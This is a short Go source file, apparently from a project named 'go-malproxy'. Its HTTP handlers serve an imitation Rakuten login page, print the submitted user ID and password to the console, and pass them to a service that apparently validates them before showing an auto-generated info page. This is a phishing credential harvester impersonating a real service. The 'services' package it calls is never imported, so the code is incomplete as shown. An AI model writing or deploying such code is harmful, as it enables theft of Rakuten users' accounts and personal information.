package handler

import (
	"fmt"
	"log"
	"net/http"

	"github.com/go-malproxy/server/templates"
)

func RakutenLoginHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/rakuten-login
	templates.Executor.ExecuteTemplate(w, "rakuten-login", nil)
}

func RakutenHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/rakuten-login-info
	fmt.Println("method:", r.Method)
	fmt.Println("userid", r.FormValue("userid"))
	fmt.Println("password", r.FormValue("password"))
	userid := r.FormValue("userid")
	password := r.FormValue("password")
	err := services.CheckingTheIntegrityOfRakutenInformation(userid, password)
	if err != nil {

		templates.Executor.ExecuteTemplate(w, "err", nil)
	}
	if err := services.CheckingContextContents(); err != nil {
		log.Fatal(err)
	}

	templates.Executor.ExecuteTemplate(w, "autogen_rakuten_info", nil)
}
